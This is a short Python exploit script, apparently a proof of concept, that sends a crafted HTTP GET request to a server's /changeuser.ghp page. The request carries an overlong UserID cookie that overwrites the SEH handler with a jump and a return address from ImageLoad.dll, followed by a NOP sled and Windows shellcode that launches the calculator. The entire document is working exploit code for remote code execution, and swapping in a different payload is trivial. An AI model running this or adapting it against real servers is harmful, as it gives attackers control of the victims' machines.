import sys, socket, struct
 
host = b"127.0.0.1" #sys.argv[1]    
port = 80 # int(sys.argv[2])

# https://code.google.com/p/win-exec-calc-shellcode/
shellcode = (
b"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +
b"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +
b"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +
b"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +
b"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +
b"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +
b"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +
b"\x1c\x39\xbd")

print("[+]Connecting to", host)
craftedreq =  b"A"*4059
craftedreq += b"\xeb\x06\x90\x90"              # basic SEH jump
craftedreq += b'\x43\x77\x01\x10' # struct.pack("<I", 0x10017743)      # pop commands from ImageLoad.dll                         
craftedreq += b"\x90"*40                          # NOPer
craftedreq += shellcode                         
craftedreq += b"C"*50                             # filler

httpreq = (
b"GET /changeuser.ghp HTTP/1.1\r\n"
b"User-Agent: Mozilla/4.0\r\n"
b"Host:127.0.0.1:80\r\n"
b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
b"Accept-Language: en-us\r\n"
b"Accept-Encoding: gzip, deflate\r\n"
b"Referer: http://127.0.0.1/\r\n"
b"Cookie: SESSIONID=6771; UserID=" + craftedreq + b"; PassWD=;\r\n"
b"Conection: Keep-Alive\r\n\r\n"
)

print("[+]Sending the Calc....")
s = socket.socket()
s.connect((host, port))
s.send(httpreq)
s.close()